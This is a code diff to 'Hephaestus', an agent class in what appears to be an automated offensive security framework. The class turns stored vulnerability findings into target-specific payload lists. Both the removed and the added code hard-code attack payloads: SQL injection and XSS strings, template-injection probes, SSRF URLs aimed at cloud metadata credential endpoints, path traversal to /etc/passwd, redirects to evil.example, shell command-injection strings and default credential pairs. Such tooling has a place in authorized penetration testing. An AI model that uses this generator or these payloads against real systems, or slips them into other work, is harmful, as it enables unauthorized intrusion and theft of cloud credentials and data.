@@ -1,6 +1,10 @@
+import re
 from datetime import datetime
 
+from sqlalchemy import select
+
 from core import wordlists as wl
+from core.models import Finding
 from .base import BaseAgent
 
 
@@ -23,13 +27,24 @@ class Hephaestus(BaseAgent):
             "forge_report": {},
         }
 
-        vulns = ares.get("vulnerabilities", [])
         technologies = hermes.get("technologies", {})
         vendors = hermes.get("vendors", [])
         domain = hermes.get("domain", target)
 
+        # Source of truth: every finding in the DB. The offensive engine writes
+        # SQLi/XSS/SSRF/SSTI/ZAP results straight there, not into
+        # ares["vulnerabilities"] (which holds only the nuclei template hits).
+        rows = await self.session.execute(
+            select(Finding).where(Finding.mission_id == self.mission_id)
+        )
+        all_findings = [f for f in rows.scalars().all()
+                        if (f.tag or "").lower() != "false_positive"]
+        actionable = [f for f in all_findings
+                      if (f.severity or "").lower() in ("critical", "high")]
+
         await self.log(
-            f"Forging from {len(vulns)} findings + {len(technologies)} tech fingerprints + {len(vendors)} vendors",
+            f"Forging from {len(actionable)} actionable finding(s) of {len(all_findings)} total "
+            f"+ {len(technologies)} tech fingerprints + {len(vendors)} vendors",
             "info",
         )
 
@@ -54,16 +69,19 @@ class Hephaestus(BaseAgent):
         except Exception as e:
             await self.log(f"Credential wordlist write failed: {e}", "warn")
 
-        # 3) Payload sets for identified vulnerability classes.
-        for vuln in vulns:
-            sev = vuln.get("severity", "info")
-            template = vuln.get("template", "")
-            matched_at = vuln.get("matched_at", "")
-            if sev in ("critical", "high") and matched_at:
-                payloads = self._payloads_for_template(template, matched_at)
-                if payloads:
-                    result["payloads_generated"].extend(payloads)
-                    result["exploitable_targets"].append(matched_at)
+        # 3) Payload sets for each actionable finding, classified by its title.
+        seen_targets = set()
+        for f in actionable:
+            cls = self._classify(f.title)
+            if not cls:
+                continue
+            url = self._target_from_evidence(f.evidence) or f"https://{domain}"
+            payloads = self._payloads_for_class(cls, url)
+            if payloads:
+                result["payloads_generated"].extend(payloads)
+                if url not in seen_targets:
+                    seen_targets.add(url)
+                    result["exploitable_targets"].append(url)
 
         result["payloads_generated"].extend(self._generic_web_payloads(technologies))
 
@@ -123,38 +141,62 @@ class Hephaestus(BaseAgent):
         ])
         return sorted(words)
 
-    def _payloads_for_template(self, template: str, url: str) -> list:
-        tl = template.lower()
-        if "sqli" in tl or "sql-injection" in tl:
-            return [
-                {"type": "SQLi", "payload": "' OR '1'='1", "target": url},
-                {"type": "SQLi", "payload": "' OR 1=1--", "target": url},
-                {"type": "SQLi", "payload": "admin'--", "target": url},
-                {"type": "SQLi", "payload": "1' AND SLEEP(5)--", "target": url},
-            ]
-        if "xss" in tl:
-            return [
-                {"type": "XSS", "payload": "<script>alert(1)</script>", "target": url},
-                {"type": "XSS", "payload": "<img src=x onerror=alert(document.domain)>", "target": url},
-                {"type": "XSS", "payload": "javascript:alert(1)", "target": url},
-            ]
-        if "ssrf" in tl:
-            return [
-                {"type": "SSRF", "payload": "http://169.254.169.254/latest/meta-data/", "target": url},
-                {"type": "SSRF", "payload": "http://localhost:8080/", "target": url},
-            ]
-        if "lfi" in tl or "path-traversal" in tl:
-            return [
-                {"type": "LFI", "payload": "../../../etc/passwd", "target": url},
-                {"type": "LFI", "payload": "....//....//....//etc/passwd", "target": url},
-            ]
-        if "default-login" in tl or "default-creds" in tl:
-            return [
-                {"type": "DefaultCreds", "payload": "admin:admin", "target": url},
-                {"type": "DefaultCreds", "payload": "admin:password", "target": url},
-                {"type": "DefaultCreds", "payload": "admin:123456", "target": url},
-            ]
-        return []
+    def _classify(self, title: str) -> str:
+        """Map a finding title to a vulnerability class for payload forging."""
+        t = (title or "").lower()
+        if "sql injection" in t or "sqli" in t:
+            return "sqli"
+        if "template injection" in t or "ssti" in t:
+            return "ssti"
+        if "cross site scripting" in t or "cross-site scripting" in t or "xss" in t:
+            return "xss"
+        if "request forgery" in t or "ssrf" in t:
+            return "ssrf"
+        if "path traversal" in t or "lfi" in t or "local file" in t or "file inclusion" in t:
+            return "lfi"
+        if "open redirect" in t:
+            return "openredirect"
+        if "command injection" in t or "remote code" in t or " rce" in t:
+            return "rce"
+        if "idor" in t or "object level" in t or "object reference" in t:
+            return "idor"
+        if "default" in t and ("cred" in t or "login" in t or "password" in t):
+            return "defaultcreds"
+        return ""
+
+    def _target_from_evidence(self, evidence: str) -> str:
+        """Pull the affected URL out of a finding's evidence text."""
+        if not evidence:
+            return ""
+        m = re.search(r"URL:\s*(\S+)", evidence)
+        if m:
+            return m.group(1).strip()
+        m = re.search(r"https?://\S+", evidence)
+        return m.group(0).strip() if m else ""
+
+    def _payloads_for_class(self, cls: str, url: str) -> list:
+        sets = {
+            "sqli": ("SQLi", ["' OR '1'='1", "' OR 1=1--", "admin'--",
+                              "1' AND SLEEP(5)--", "1 UNION SELECT NULL--"]),
+            "xss": ("XSS", ["<script>alert(document.domain)</script>",
+                            "\"><img src=x onerror=alert(document.domain)>",
+                            "javascript:alert(1)"]),
+            "ssti": ("SSTI", ["{{7*7}}", "${{7*7}}", "<%= 7*7 %>", "#{7*7}",
+                              "{{''.__class__.__mro__[1].__subclasses__()}}"]),
+            "ssrf": ("SSRF", ["http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                              "http://metadata.google.internal/computeMetadata/v1/",
+                              "file:///etc/passwd", "http://127.0.0.1:80/"]),
+            "lfi": ("LFI", ["../../../../etc/passwd", "....//....//....//etc/passwd",
+                            "..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd%00"]),
+            "openredirect": ("OpenRedirect", ["https://evil.example", "//evil.example",
+                                              "https:/evil.example"]),
+            "rce": ("RCE", [";id", "|id", "$(id)", "`id`", "& whoami"]),
+            "idor": ("IDOR", ["increment/decrement the object id and replay the request"]),
+            "defaultcreds": ("DefaultCreds", ["admin:admin", "admin:password",
+                                              "admin:123456", "root:root"]),
+        }
+        kind, payloads = sets.get(cls, ("", []))
+        return [{"type": kind, "payload": p, "target": url} for p in payloads]
 
     def _generic_web_payloads(self, technologies: dict) -> list:
         all_techs = []
